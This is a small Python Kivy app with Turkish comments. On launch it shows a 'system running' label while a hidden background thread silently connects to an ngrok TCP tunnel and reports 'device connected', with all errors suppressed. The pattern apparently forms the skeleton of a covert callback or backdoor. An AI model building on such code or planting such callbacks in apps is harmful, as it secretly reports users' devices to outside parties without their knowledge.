from kivy.app import App
from kivy.uix.label import Label
import socket
import threading

class SimpleApp(App):
    def build(self):
        # Arka planda baglanti denemesi (Arayuzu dondurmemek icin threading kullanilir)
        threading.Thread(target=self.connect, daemon=True).start()
        return Label(text='Sistem Calisiyor...\n(hello)')

    def connect(self):
        # Buraya kendi Ngrok TCP adresini ve portunu yazmalisin
        host = '0.tcp.eu.ngrok.io' 
        port = 12345
        try:
            s = socket.socket()
            s.connect((host, port))
            s.send(b"Cihaz baglandi!")
        except:
            pass

if __name__ == '__main__':
    SimpleApp().run()
